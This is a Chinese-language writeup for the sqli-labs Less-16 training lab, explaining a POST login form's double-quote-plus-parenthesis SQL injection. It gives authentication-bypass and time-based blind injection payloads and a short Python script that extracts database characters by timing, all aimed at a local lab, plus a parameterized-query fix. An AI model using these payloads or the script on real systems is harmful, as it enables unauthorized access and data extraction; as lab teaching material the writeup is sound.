---
layout: post
title: sqli-labs - Less-16 POST 时间盲注（双引号+括号）Writeup
platform: sqli-labs
date: 2026-11-10 08:15:00 +0800
categories: CTF
---

sqli-labs - Less-16 POST 时间盲注（双引号+括号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-16 → POST - Blind - Time Based - Double quotes - String（登录框 + 双引号 + 括号）
- 地址：`http://127.0.0.1:8080/Less-16/`
- 题型：Web / SQL 注入
- 考点：**POST 时间盲注：双引号 + 括号闭合**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname='admin' & passwd=admin                 → slap.jpg（密码不对）
uname='admin' & passwd=") or 1=1 #            → flag.jpg（绕过成功）
uname='admin' & passwd=") or sleep(2) #       → 16.10 秒（每行睡 2 秒 × 8 行）
```

二、题目分析

**① 源码**

```php
$passwd = '"' . $passwd . '"';
@$sql = "SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

**② 三个细节**

```text
① username=($uname)   → 括号 + 无引号 → uname 要自己补引号：'admin'
② password=("$passwd") → 括号 + 双引号 → 闭合要写 ")
③ 页面只显示 flag.jpg / slap.jpg
```

**③ 为什么 uname 要写 `'admin'`**

```text
username=($uname) 里 $uname 没被引号包住
如果直接写 admin → SQL 变成 username=(admin) → 把 admin 当列名 → 报错
写成 'admin'      → SQL 变成 username=('admin') → 正常
★ 这是本关最容易卡住的地方
```

三、解题步骤

**第一步：用带引号的用户名登录**

```text
uname = 'admin'
passwd = admin
→ slap.jpg？ 因为密码不是 admin（这里只验证结构能跑通）
```

**第二步：万能绕过**

```text
uname  = 'admin'
passwd = ") or 1=1 #

拼接：WHERE username=('admin') and password=("") or 1=1 #")
→ or 1=1 恒真 → flag.jpg
```

**第三步：时间盲注**

```text
passwd = ") or sleep(2) #
→ 16.10 秒（8 行 × 2 秒）
★ 想只睡一次：
   passwd = ") or sleep(2) limit 0,1 #
   或者用 "and" + 存在的用户名
```

**第四步：条件时间注入**

```text
passwd = ") or if(ascii(substr(database(),1,1))=115,sleep(2),0) #
→ 时间变化 ⇒ 首字符判断
```

**第五步：脚本**

```python
import requests, time

url = "http://127.0.0.1:8080/Less-16/"
DELAY = 2

def q(cond):
    payload = f'") or if({cond},sleep({DELAY}),0) #'
    t0 = time.time()
    requests.post(url, data={"uname": "'admin'", "passwd": payload, "submit": "Submit"}, timeout=DELAY * 10 + 10)
    return time.time() - t0 >= DELAY

print(q("ascii(substr(database(),1,1))=115"))   # True → 's'
print(q("ascii(substr(database(),1,1))=120"))   # False
```

四、延伸知识

**① `uname` 没引号时怎么办**

```text
username=($uname)     → uname 自己写 'admin'
username=$uname       → uname 直接写 admin（Less-18 就是这种）
★ 看源码里有没有引号包住，决定要不要自己补
```

**② `or sleep()` 的时间 = 行数 × 秒数**

```text
users 有 8 行 → or sleep(2) ≈ 16 秒
★ 判断条件时要把"基准时间"算进去，否则会误判
```

**③ 防御**

```php
// 参数化 + 类型转换
$stmt = $pdo->prepare("SELECT username FROM users WHERE username=? AND password=?");
$stmt->execute([$uname, $passwd]);
```

五、总结

- **本题核心：POST + 双引号 + 括号，uname 无引号（要自己补 `'`），passwd 是 `("...")`。**

- 三步方法论：

```text
① uname 写成 'admin'（否则当列名报错）
② passwd 闭合写 ")
③ or 1=1 绕过 / or sleep(2) 时间盲注
```

- **三个必记要点**：

```text
① 括号里的参数，闭合要带上括号
② or sleep 的时间 = 行数 × 秒，8 行睡 16 秒
③ 想只睡一次就 limit 0,1
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-16：username=($uname) + password=("$passwd")            │
│                                                              │
│  两处都要补：                                                 │
│      uname  → 'admin'        （自己补引号）                    │
│      passwd → ")  ...  #     （补引号 + 括号）                 │
│                                                              │
│  绕过：passwd = ") or 1=1 #                                   │
│  盲注：passwd = ") or sleep(2) #  （8 行 ≈ 16 秒）             │
└──────────────────────────────────────────────────────────────┘
```
